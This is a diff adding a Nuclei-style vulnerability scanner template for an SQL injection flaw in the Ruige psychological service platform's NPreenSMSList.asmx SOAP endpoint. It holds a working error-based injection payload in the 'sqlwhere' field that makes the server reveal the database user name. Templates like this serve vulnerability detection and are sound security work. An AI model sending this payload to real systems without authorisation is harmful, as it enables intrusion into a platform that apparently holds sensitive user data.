@@ -1,0 +1,41 @@
+id: ruige-npreensmslist-sqli
+
+info:
+  name: Ruige NPreenSMSList - SQL injection
+  author: qwtd
+  severity: high
+  description: 瑞格智慧心理服务平台NPreenSMSList.asmx存在sql注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。
+  tags: 瑞格智慧心理服务平台
+
+http:
+  - raw:
+      - |
+        POST /NPreenManage/NPreenSMSList.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: length
+        SOAPAction: "RuiGe.WebUi.NPreenSMS/Seach"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <Seach xmlns="RuiGe.WebUi.NPreenSMS">
+              <sqlwhere>and 1=convert(int,user_name())</sqlwhere>
+            </Seach>
+          </soap:Body>
+        </soap:Envelope>
+    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+
+      - type: word
+        part: body
+        words:
+          - "dbo"
+          - "SqlException"
+          - "SoapException"
+        condition: and
+
